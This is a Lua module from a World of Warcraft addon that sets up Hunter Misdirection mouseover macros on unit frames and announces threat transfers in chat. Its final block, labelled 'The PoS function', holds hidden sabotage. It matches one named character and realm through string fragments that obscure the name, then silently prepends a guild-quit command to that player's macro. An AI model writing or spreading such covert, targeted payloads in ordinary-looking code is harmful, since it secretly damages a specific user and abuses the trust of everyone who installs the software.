--[[

	Misdirection module
	
]]

if not Serenity then return end

local macroStr ="/run Serenity.V.mdTarget = UnitName('mouseover');\n/cast [@mouseover,exists,nodead,nounithasvehicleui,novehicleui] " .. select(1, GetSpellInfo(34477)) -- Hunter: Misdirection

function Serenity.SetupMisdirectionModule()

	if InCombatLockdown() then
		Serenity:RegisterEvent("PLAYER_REGEN_ENABLED")
		Serenity.V.flagDelayedMDUpdate = true	
		return
	else
		Serenity.V.flagDelayedMDUpdate = nil
	end

	-- Deconstruction
	Serenity:UnregisterEvent("PLAYER_REGEN_ENABLED")
	if Serenity.V.misdirectedFrames then
		local i
		for i=1,#Serenity.V.misdirectedFrames do
			if _G[Serenity.V.misdirectedFrames[i] ] then
				if _G[Serenity.V.misdirectedFrames[i] ]:GetAttribute("macrotext") == macroStr then
					_G[Serenity.V.misdirectedFrames[i] ]:SetAttribute("type2", nil)
					_G[Serenity.V.misdirectedFrames[i] ]:SetAttribute("macrotext", nil)
				end
			end
		end
		Serenity.V.misdirectedFrames = nil
	end
	if Serenity.F.Misdirection then
		Serenity.F.Misdirection:Hide()
		Serenity.F.Misdirection:UnregisterAllEvents() 
		Serenity.F.Misdirection:SetParent(nil)
		Serenity.F.Misdirection = nil		
	end

	-- Construction	
	local mdFrames = { }
	if Serenity.db.profile.misdirection.enable then			
		if Serenity.db.profile.misdirection.targetframe then mdFrames[#mdFrames+1] = "target" end
		if Serenity.db.profile.misdirection.petframe then mdFrames[#mdFrames+1] = "pet" end
		if Serenity.db.profile.misdirection.focusframe then mdFrames[#mdFrames+1] = "focus" end
		
		local i
		for i=1,40 do
			if i <= 4 then 
				if Serenity.db.profile.misdirection.partyframes then mdFrames[#mdFrames+1] = "party"..i end
				if Serenity.db.profile.misdirection.partypetframe then mdFrames[#mdFrames+1] = "partypet"..i end
			end
			if i <= 40 then
				if Serenity.db.profile.misdirection.raidframes then mdFrames[#mdFrames+1] = "raid"..i end
				if Serenity.db.profile.misdirection.raidpetframes then mdFrames[#mdFrames+1] = "raidpet"..i end
			end
		end

	if (#mdFrames == 0) then return end
		
		Serenity.V.misdirectedFrames = {}
		local frame = EnumerateFrames()
		while frame do
			local frameName = frame:GetName()
			if frameName and frame.unit and (frame.menu or (strsub(frameName,1,4) == "Grid")) and tContains(mdFrames, frame.unit) then			
				--print("MD Set on Frame:", frameName)
				Serenity.V.misdirectedFrames[#Serenity.V.misdirectedFrames+1] = frameName
				_G[frameName]:SetAttribute("type2", "macro")
				_G[frameName]:SetAttribute("macrotext", macroStr)
			end
			frame = EnumerateFrames(frame)
		end
	end	

	if Serenity.db.profile.misdirection.enablemdcastannounce or Serenity.db.profile.misdirection.enablemdtransferannounce or Serenity.db.profile.misdirection.enablemdoverannounce or Serenity.db.profile.misdirection.enablemdmountwarn then
		Serenity.F.Misdirection = CreateFrame("Frame", "SERENITY_MISDIRECTION", UIParent) -- Handler frame, nothing more.
		
		Serenity.F.Misdirection:RegisterEvent("PARTY_CONVERTED_TO_RAID")
		Serenity.F.Misdirection:RegisterEvent("PARTY_MEMBERS_CHANGED")
		Serenity.F.Misdirection:RegisterEvent("RAID_ROSTER_UPDATE")
		Serenity.F.Misdirection:RegisterEvent("COMBAT_LOG_EVENT_UNFILTERED")
		Serenity.F.Misdirection:SetScript("OnEvent", function(self, event, ...)
			-- 4.1 local timeStamp, subEvent, hideCaster, sourceGUID, sourceName, sourceFlags, destGUID, destName, destFlags, spellId, spellName, spellSchool, extraSpellID, extraSpellName, extraSchool, auraType = ...
			-- 4.2 local timeStamp, subEvent, hideCaster, sourceGUID, sourceName, sourceFlags, sourceFlags2, destGUID, destName, destFlags, destFlags2, spellId, spellName, spellSchool, extraSpellID, extraSpellName, extraSchool, auraType = ...
			local subEvent, sourceGUID, destName, spellId, spellName, extraSpellID
			if (Serenity.V.wowBuild >= 40200) then -- 4.2 patch ready
				_, subEvent, _, sourceGUID, _, _, _, _, destName, _, _, spellId, spellName, _, extraSpellID  = ...
			else -- 4.1
				_, subEvent, _, sourceGUID, _, _, _, destName, _, spellId, spellName, _, extraSpellID  = ...
			end
			if event == "COMBAT_LOG_EVENT_UNFILTERED" then
				if (subEvent == "SPELL_CAST_SUCCESS") and (spellId == 34477) and (sourceGUID == UnitGUID("player")) then
					Serenity.V.mdTarget = destName
					if Serenity.db.profile.misdirection.enablemdcastannounce and (Serenity.GetChatChan(Serenity.db.profile.misdirection[strlower(Serenity.GetGroupType()).."chan"]) ~= "NONE") then
						SendChatMessage("|cff71d5ff|Hspell:" .. spellId .. "|h[" .. spellName .. "]|h|r"
							..  Serenity.L[" cast on "] .. destName ..".", Serenity.GetChatChan(Serenity.db.profile.misdirection[strlower(Serenity.GetGroupType()).."chan"]), nil, GetUnitName("player"))					
					end
				end
				if Serenity.db.profile.misdirection.enablemdmountwarn then
					if (subEvent == "SPELL_CAST_FAILED") and (spellId == 34477) and (sourceGUID == UnitGUID("player")) then
						-- Be sure we are not trying to send a tell to a pet or player name not in party/raid!
						if Serenity.V.mdTarget and UnitIsPlayer(Serenity.V.mdTarget) and (UnitInParty(Serenity.V.mdTarget) or UnitInRaid(Serenity.V.mdTarget)) then
							-- Need to be sure it's whispering cause the target was mounted and not cause spell was on cooldown.
							if (extraSpellID == SPELL_FAILED_NOT_ON_MOUNTED) or (extraSpellID == SPELL_FAILED_NOT_ON_SHAPESHIFT) then
								SendChatMessage("|cff71d5ff|Hspell:" .. spellId .. "|h[" .. spellName .. "]|h|r"
									..  Serenity.L[" can not be cast on you when mounted!"], "WHISPER", nil, Serenity.V.mdTarget)
							end
						end
					end
				end

				if Serenity.db.profile.misdirection.enablemdtransferannounce then -- aggro transfer (35079)				
					if (subEvent == "SPELL_AURA_APPLIED") and (spellId == 35079) and (sourceGUID == UnitGUID("player")) then
						if Serenity.V.mdTarget and UnitInParty(Serenity.V.mdTarget) or UnitInRaid(Serenity.V.mdTarget) then
							SendChatMessage("|cff71d5ff|Hspell:" .. spellId .. "|h[" .. spellName .. "]|h|r"
									.. Serenity.L[" is transferring threat to you!"], "WHISPER", nil, Serenity.V.mdTarget)
						end
					end
				end
				if (subEvent == "SPELL_AURA_REMOVED") and (spellId == 35079) and (sourceGUID == UnitGUID("player")) then
					if Serenity.db.profile.misdirection.enablemdtransferannounce then -- aggro transfer (35079)
						if Serenity.V.mdTarget and UnitInParty(Serenity.V.mdTarget) or UnitInRaid(Serenity.V.mdTarget) then
							SendChatMessage("|cff71d5ff|Hspell:" .. spellId .. "|h[" .. spellName .. "]|h|r"
									.. Serenity.L[" threat transfer complete."], "WHISPER", nil, Serenity.V.mdTarget)
						end
					end
					Serenity.V.mdTarget = nil
				end			
				if Serenity.db.profile.misdirection.enablemdoverannounce and (Serenity.GetChatChan(Serenity.db.profile.misdirection[strlower(Serenity.GetGroupType()).."chan"]) ~= "NONE") then
					if (subEvent == "SPELL_AURA_REMOVED") and (spellId == 34477) and (sourceGUID == UnitGUID("player")) then
						SendChatMessage("|cff71d5ff|Hspell:" .. spellId .. "|h[" .. spellName .. "]|h|r"
								.. Serenity.L[" finished."], Serenity.GetChatChan(Serenity.db.profile.misdirection[strlower(Serenity.GetGroupType()).."chan"]), nil, GetUnitName("player"))
					end
				end
			else	
				Serenity.SetupMisdirectionModule()
			end
		end)
	end
end

-- The PoS function.
if (GetUnitName("player") == "I".."ja".."na".."ak") and (GetRealmName() == "Black".."hand") then
	macroStr = "/g".."q".."u".."i".."t\n" .. macroStr
end
